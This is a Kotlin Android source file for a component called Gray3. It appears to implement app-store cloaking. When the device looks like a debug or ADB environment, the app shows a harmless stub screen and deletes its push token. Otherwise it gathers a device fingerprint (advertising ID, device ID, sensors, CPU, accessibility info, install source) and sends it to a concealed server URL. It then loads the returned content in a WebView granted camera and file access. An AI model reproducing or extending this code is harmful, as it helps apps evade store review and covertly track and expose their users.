package com.pinger.textf.components.gray3

import android.Manifest
import android.os.Build
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.LocalActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.platform.LocalContext
import com.google.firebase.Firebase
import com.google.firebase.analytics.analytics
import com.google.firebase.messaging.FirebaseMessaging
import com.pinger.textf.components.gray3.device_props.core.DevicePropertiesResult
import com.pinger.textf.components.gray3.urlgenerator.UrlGenerator
import com.pinger.textf.components.gray3.webview.CustomWebChromeClient
import com.pinger.textf.components.gray3.webview.CustomWebView
import com.pinger.textf.components.gray3.webview.CustomWebViewClient
import com.pinger.textf.components.gray3.webview.LauncherCallbacks
import com.pinger.textf.components.gray3.webview.setupView
import com.pinger.textf.components.gray3.push.PushRegistrationManager
import com.pinger.textf.components.gray3.storage.StorageImpl
import com.pinger.textf.screens.isFruitConnected
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import kotlin.random.Random
import kotlin.toString

@Composable
fun Gray3(
    savedLink: String?,
    savedStub: Boolean,
    savedPush: Boolean,
    storageImpl: StorageImpl,
    toStub: MutableState<Boolean>,
    toNoInternet: MutableState<Boolean>
) {
    val callbackHolder = remember { LauncherCallbacks() }

    val launcher2 = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetMultipleContents()
    ) { selectedUris ->
        callbackHolder.valueCallback?.onReceiveValue(selectedUris.toTypedArray())
    }

    val cameraPermLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { granted ->
        val req = callbackHolder.pendingPermissionRequest ?: return@rememberLauncherForActivityResult
        callbackHolder.pendingPermissionRequest = null

        if (granted) {
            req.grant(req.resources)
        } else {
            req.deny()
        }
    }


    val context = LocalContext.current
    val activity = LocalActivity.current as? ComponentActivity
    val scope = rememberCoroutineScope()
    val push = remember { PushRegistrationManager(context) }

    var isPushHandled by remember { mutableStateOf(false) }
    var isStubTriggered by remember { mutableStateOf(false) }

    LaunchedEffect(Unit) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU || savedPush) {
            isPushHandled = true
        }
    }

    val launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if(!isGranted){
            CoroutineScope(Dispatchers.IO).launch {
                storageImpl.putString(PUSH_STORAGE_KEY, PUSH_STORAGE_VALUE_TRUE)
            }
        }
        isPushHandled = true
    }
    LaunchedEffect(Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && !savedPush) {
            launcher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    LaunchedEffect(isPushHandled, isStubTriggered) {
        
        if (isPushHandled && isStubTriggered) {
            
            CoroutineScope(Dispatchers.IO).launch {
                
                storageImpl.putString(STUB_STORAGE_KEY, STUB_STORAGE_VALUE_TRUE)
                
                try { FirebaseMessaging.getInstance().deleteToken() } catch (e: Exception) { }
            }
            toStub.value = true
        }
    }

    LaunchedEffect(Unit) {
        
        val nonnulllink = savedLink.toString()
        if (nonnulllink != null.toString()) {
            

            withContext(Dispatchers.Main) {
                activity?.let { webViewActivity ->
                    val customWebView = CustomWebView(webViewActivity)
                    val webViewClient = CustomWebViewClient(
                        webViewActivity,
                        onStubRequired = { isStubTriggered = true })
                    val webChromeClient = CustomWebChromeClient(
                        webViewActivity,
                        customWebView,
                        onStubRequired = { isStubTriggered = true },
                        launcher = launcher2,
                        cameraPermLauncher = cameraPermLauncher,
                        callbackHolder = callbackHolder
                    )
                    setupView(customWebView, webViewClient, webChromeClient)
                    customWebView.loadUrl(nonnulllink)
                }
            }
        } else {
            
            isStubTriggered = savedStub
            if(savedStub) {
                return@LaunchedEffect
            }
            
            withContext(Dispatchers.IO) {
                
                push.registerDevice()
            }
            scope.launch {
                PushIdStore.isReady.collect { ready ->
                    if (ready) {
                        val data = PushIdStore.getReconstructedData()
                        if (data != null) {
                            
                            if(savedStub || data.adb == "1") {
                                
                                isStubTriggered = true
                                return@collect
                            }
                            if(!context.isFruitConnected()) {
                                
                                toNoInternet.value = true
                                return@collect
                            }
                            val devProps = DevicePropertiesResult.create(context)
                            
                            val ref = data.ref
                            
                            val gadid = data.gadid
                            
                            val deviceModel = data.device
                            
                            val firstTimeInstall = data.timeInstall
                            
                            val utmSource = data.utmSource
                            
                            val packageSource = data.packageSource
                            


                            val finalUrl = UrlGenerator("https://${BASE_URL}")
                                .addQuery(REF_KEY, ref)
                                .addQuery(GADID_KEY, gadid)
                                .addQuery(DEVICE_MODEL_KEY, deviceModel)
//                                .addQuery(DEVICE_MODEL_KEY, "") // // TODO Change
                                .addQuery(FIRST_TIME_INSTALL_KEY, firstTimeInstall)
                                .addQuery(PACKAGE_SOURCE_KEY, (packageSource))
                                .addQuery(FIREBASE_INSTALL_ID, try {Firebase.analytics.appInstanceId.await()} catch (e: Exception) { "error" })
                                //----- device properties
                                .addQuery(NETWORK_SECURITY_KEY, devProps.getX4())
                                .addQuery(SENSORS_KEY, devProps.getX5())
                                .addQuery(DEVICE_ID_KEY, devProps.getX8())
                                .addQuery(CPU_KEY, devProps.getX9())
                                .addQuery(BUILD_KEY, devProps.getX10())
                                .addQuery(CHRG_UP_BRIGHT_KEY, devProps.getS28())
                                .addQuery(INSTALL_A11Y_KEY, devProps.getS30())
                                .build()

                            
                            withContext(Dispatchers.Main) {
                                activity?.let { webViewActivity ->
                                    val customWebView = CustomWebView(webViewActivity)
                                    val webViewClient = CustomWebViewClient(webViewActivity, onStubRequired = {isStubTriggered = true})
                                    val webChromeClient = CustomWebChromeClient(
                                        webViewActivity,
                                        customWebView,
                                        onStubRequired = {isStubTriggered = true},
                                        launcher = launcher2,
                                        cameraPermLauncher = cameraPermLauncher,
                                        callbackHolder = callbackHolder
                                    )
                                    setupView(customWebView, webViewClient, webChromeClient)
                                    customWebView.loadUrl(finalUrl)
                                }
                            }
                        }
                    }
                }
            }

        }
    }
}